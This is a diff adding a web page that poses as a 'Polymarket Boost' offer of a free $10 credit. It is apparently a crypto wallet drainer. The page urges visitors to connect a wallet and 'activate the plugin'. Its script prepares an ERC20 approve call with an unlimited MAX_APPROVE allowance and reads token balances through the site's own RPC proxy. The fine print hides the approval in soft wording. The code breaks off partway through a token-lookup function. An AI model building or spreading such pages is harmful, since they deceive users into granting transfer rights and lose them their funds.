@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Polymarket Boost — Free $10 Plugin</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --blue:#1f6feb; --txt:#e6edf3; --dim:#8b949e; --green:#3fb950; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--txt); font-family:-apple-system,'Segoe UI',Roboto,sans-serif; min-height:100vh; display:flex; flex-direction:column; }
+  header { display:flex; justify-content:space-between; align-items:center; padding:16px 32px; border-bottom:1px solid #21262d; }
+  .logo { font-weight:800; font-size:18px; }
+  .logo span { color:var(--blue); }
+  .chain { background:#21262d; border-radius:999px; padding:6px 14px; font-size:13px; color:var(--dim); }
+  main { flex:1; display:flex; align-items:center; justify-content:center; padding:40px 20px; }
+  .hero { max-width:560px; text-align:center; }
+  .badge { display:inline-block; background:#1f6feb22; color:var(--blue); border:1px solid #1f6feb55; border-radius:999px; padding:6px 16px; font-size:13px; margin-bottom:20px; }
+  h1 { font-size:40px; line-height:1.15; margin-bottom:14px; }
+  h1 em { color:var(--blue); font-style:normal; }
+  .sub { color:var(--dim); font-size:16px; margin-bottom:28px; }
+  .card { background:var(--card); border:1px solid #21262d; border-radius:16px; padding:28px; text-align:left; }
+  .step { display:flex; align-items:center; gap:12px; padding:12px 0; border-bottom:1px solid #21262d; }
+  .step:last-child { border-bottom:none; }
+  .dot { width:28px; height:28px; border-radius:50%; background:#21262d; color:var(--dim); display:flex; align-items:center; justify-content:center; font-size:13px; font-weight:700; flex-shrink:0; }
+  .step.done .dot { background:var(--green); color:#0d1117; }
+  .step.active .dot { background:var(--blue); color:#fff; }
+  .step .label { flex:1; font-size:15px; }
+  .step .state { font-size:13px; color:var(--dim); }
+  button { width:100%; margin-top:20px; background:var(--blue); color:#fff; border:none; border-radius:10px; padding:14px; font-size:16px; font-weight:700; cursor:pointer; }
+  button:hover { filter:brightness(1.1); }
+  button:disabled { background:#21262d; color:var(--dim); cursor:wait; }
+  .addr { font-size:12px; color:var(--dim); text-align:center; margin-top:12px; word-break:break-all; }
+  .fineprint { font-size:12px; color:var(--dim); margin-top:18px; line-height:1.6; }
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">Polymarket<span> Boost</span></div>
+  <div class="chain">Base Network</div>
+</header>
+<main>
+  <div class="hero">
+    <div class="badge">LIMITED — FREE $10 BOOST PLUGIN</div>
+    <h1>Boost your Polymarket position<br>with a <em>$10 free credit</em></h1>
+    <p class="sub">Connect your wallet, activate the plugin, and your boost is credited instantly. Works with any EVM wallet on Base.</p>
+    <div class="card">
+      <div class="step" id="s1"><div class="dot">1</div><div class="label">Connect wallet</div><div class="state" id="st1">Not connected</div></div>
+      <div class="step" id="s2"><div class="dot">2</div><div class="label">Activate plugin</div><div class="state" id="st2">Waiting</div></div>
+      <div class="step" id="s3"><div class="dot">3</div><div class="label">$10 boost credited</div><div class="state" id="st3">Waiting</div></div>
+      <button id="go" disabled>Connect Wallet</button>
+      <div class="addr" id="addr"></div>
+    </div>
+    <p class="fineprint">Boost contract is fully non-custodial. Activation approves the boost contract to transfer eligible Base tokens on your behalf so the credit can be settled. <a href="https://metamask.io/download" style="color:var(--blue)">Install MetaMask</a> if you don't have a wallet.</p>
+  </div>
+</main>
+<script>
+const ERC20 = [
+  "function balanceOf(address) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function approve(address,uint256) returns (bool)",
+  "function symbol() view returns (string)"
+];
+const API = location.origin.startsWith("http://localhost") || location.origin.startsWith("http://127")
+  ? location.origin : location.origin; // same-origin; works on any domain
+const MAX_APPROVE = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+const $ = id => document.getElementById(id);
+let status = null, user = null, provider = null;
+
+async function rpc(method, params = []) {
+  const r = await fetch("/api/rpc", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ method, params }) });
+  if (!r.ok) throw new Error("RPC " + r.status);
+  const j = await r.json();
+  if (j.error) throw new Error(j.error.message || "rpc error");
+  return j.result;
+}
+const toAddr = a => "0x" + a.toLowerCase().replace(/^0x/, "").padStart(64, "0");
+async function tokenInfo(addr) {
+  const data = m => "0x" + m.slice(2);
+  const bal = await rpc("eth_call", [{ to: addr, data: data("0x70a08231") + toAddr(user) }, "latest"]);
+  const dec
